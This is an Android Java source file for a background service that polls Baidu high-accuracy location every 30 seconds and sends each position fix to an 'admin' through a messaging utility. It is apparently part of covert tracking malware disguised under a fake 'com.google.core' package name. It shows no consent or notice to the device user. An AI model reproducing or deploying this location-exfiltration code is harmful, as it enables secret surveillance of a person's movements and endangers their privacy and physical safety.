package com.google.core.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.google.core.domain.Location;
import com.google.core.domain.MsgType;
import com.google.core.utils.JsonUtils;
import com.google.core.utils.MsgUtils;

public class BDLocationService extends Service {
	public class BDLocListener implements BDLocationListener{


		@Override
		public void onReceiveLocation(BDLocation location) {
			Location loc=new Location();
			loc.setLatitude(location.getLatitude());
			loc.setLongitude(location.getLongitude());
			loc.setDate(System.currentTimeMillis());
			loc.setDirection(location.getDirection());
			loc.setNetworkLocationType(location.getNetworkLocationType());
			loc.setRadius(location.getRadius());
			
			MsgUtils.sendToAdmin(getApplicationContext(), MsgType.LOCATION, loc);
			
		}
		
	}
	public static boolean isStart=false;
	private static final String TAG="BDLocationService";
	public LocationClient mLocationClient = null;
	private int span=30000;
	private String tempcoor="bd09ll";
	private LocationMode tempMode=LocationMode.Hight_Accuracy;
	/**
	 * 初始化定位服务
	 */
	private void initLocation(){
		Log.v(TAG, "初始化定位服务");
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(tempMode);//设置定位模式
		option.setCoorType(tempcoor);//返回的定位结果是百度经纬度，默认值gcj02
		option.setScanSpan(span);//设置发起定位请求的间隔时间为5000ms
		option.setIsNeedAddress(false);
		mLocationClient.setLocOption(option);
	}
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	@Override
	public void onCreate() {
		mLocationClient = new LocationClient(getApplicationContext());     //声明LocationClient类
		mLocationClient.registerLocationListener(  new BDLocListener() );    //注册监听函数
		initLocation();
		Log.v(TAG, "开始定位服务");
		if(mLocationClient!=null){
			mLocationClient.start();
			isStart=true;
		}
		super.onCreate();
	}
	@Override
	public void onDestroy() {
		Log.v(TAG, "停止定位服务");
		if(mLocationClient!=null && isStart){
			mLocationClient.stop();
			isStart=false;
		}
		super.onDestroy();
	}

	private void sendTo(String type, String msg) {
		Intent intent = new Intent();
		intent.putExtra("msg", msg);
		intent.putExtra("type", type);
		intent.setAction(WsService.ACTION);
		sendBroadcast(intent);
	}
	
}

